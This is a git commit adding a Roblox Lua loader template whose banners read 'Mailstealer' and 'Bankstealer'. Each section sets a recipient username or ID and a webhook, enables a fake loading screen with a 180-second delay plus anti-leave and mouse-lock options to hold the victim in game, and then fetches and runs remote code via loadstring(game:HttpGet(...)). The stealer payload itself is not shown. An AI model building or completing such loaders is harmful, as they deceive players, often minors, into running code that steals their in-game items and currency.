52fd0f709acc9a9c862a133510046e36ad85b5d3
OfficialPSX <143141268+OfficialPSX@users.noreply.github.com>
2023-08-28 15:36:18 +0800

    Add files via upload

---
+++ loadstrings.lua
@@ -0,0 +1,63 @@
+--[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+]]--
+
+UserName = "UserName Here"
+Webhook = "Webhook Here"
+UserName2 = "2nd UserName Here"
+
+_G.LoadingScreen = false -- make it true if you want the loadingscreen
+_G.AntiLeave = false -- make it true if you want the antileave
+_G.MouseLock = false -- make it true if you want the mouselock
+
+-- Remove These If You're Not Using The Rizz LoadingScreen
+
+_G.ScriptName = "Script Name"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
+
+loadstring(game:HttpGet("raw link"))()
+
+--[[
+   ____              _        _             _           
+  | __ )  __ _ _ __ | | _____| |_ ___  __ _| | ___ _ __ 
+  |  _ \ / _` | '_ \| |/ / __| __/ _ \/ _` | |/ _ \ '__|
+  | |_) | (_| | | | |   <\__ \ ||  __/ (_| | |  __/ |   
+  |____/ \__,_|_| |_|_|\_\___/\__\___|\__,_|_|\___|_| 
+
+]]--
+
+_G.UserID = "UserID Here"
+_G.Webhook = "Webhook Here"
+
+_G.LoadingScreen = false -- make it true if you want the loadingscreen
+_G.AntiLeave = false -- make it true if you want the antileave
+_G.MouseLock = false -- make it true if you want the mouselock
+
+-- Remove These If You're Not Using The Rizz LoadingScreen
+
+_G.ScriptName = "Script Name"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
+
+loadstring(game:HttpGet("raw link"))()
+
+--[[
+  __     ___                 _ 
+  \ \   / (_)___ _   _  __ _| |
+   \ \ / /| / __| | | |/ _` | |
+    \ V / | \__ \ |_| | (_| | |
+     \_/  |_|___/\__,_|\__,_|_|
+
+]]
+
+loadstring(game:HttpGet("raw link"))()
